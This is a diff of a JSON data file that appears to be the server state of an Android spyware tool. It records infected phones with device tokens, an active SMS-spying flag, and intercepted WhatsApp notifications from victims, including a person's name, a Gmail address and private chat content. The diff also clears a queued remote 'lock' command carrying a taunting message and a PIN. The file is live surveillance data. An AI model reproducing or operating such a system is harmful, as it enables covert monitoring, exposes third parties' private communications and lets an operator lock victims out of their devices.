@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776957197299,
+    "lastSeen": 1776957203311,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎71 pesan dari 41 chat",
+        "time": "23/04 23:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957204143
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: BEW STORE",
+        "content": "Memberi reaksi 🕒 pada \"APK PREMIUM 2K26\nLIST:\ncanva member 1d : 2p\ncanva member 7d : 1k\ncanva member 1b : 3k\ncanva member 1y : 25k\ncanva lifetime : 50k\nam 1y acc s : 25k\nviu privanlim 1b : 3k\nviu privanlim 6b : 10k\nviu privanlim 1y : 2k\nviu lifetime : 50k\nnetflix 2u1b : 25.000\nnetflix semi 1b : 45.000\ncapcut 7d shar : 480p\ncapcut 1b shar : 1.900\ncapcut 35d priv : 3.400\ncapcut 7d priv : 680p\nyoutube famp 1b (b) : 150p\nyoutube indp 1b (b) : 500p\nyoutube head 1b (b) : 2.000\npicsart 7d : 100p\npicsart 1b : 500p\niqiyi prem shar 1b : 2.780\nprime vidio shar 1b : 2.800\nwibuku shar 1b : 3.800\nbstation 1b : 3.750\nvidio only tv : 800p\nsushiroll 1b : 2.900\ncatchplay 1b : 3.000\nyouku 3b : 4.700\nchatgpt+ shar 1b : 7.000\n\naplikasi lain tanyakan yaw xxixixixi\"",
+        "time": "23/04 23:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957203847
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 20:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1776948097215
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948086782
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Wabot",
-        "content": "📷 Thank you, Rama Yandi. The Wabot account for at6327638@gmail.com has been activated.\n\nLog in here:\nhttps://app.wabot.my/login or click button login to link your number 👇\n\nUser guide:\nhttps://docs.fatomate.com . Please check your email to get special coupon 20% off. \n\nIf you experience any issues, please let us know.",
-        "time": "23/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948086710
       }
     ],
     "galleryPhotos": [],
@@ -16669,17 +16669,8 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776957195042,
-    "commandQueue": [
-      {
-        "type": "lock",
-        "payload": {
-          "text": "WKWKWK",
-          "pin": "1234"
-        },
-        "sentAt": 1776957198292
-      }
-    ],
+    "lastSeen": 1776957201309,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
     "deviceInfo": {
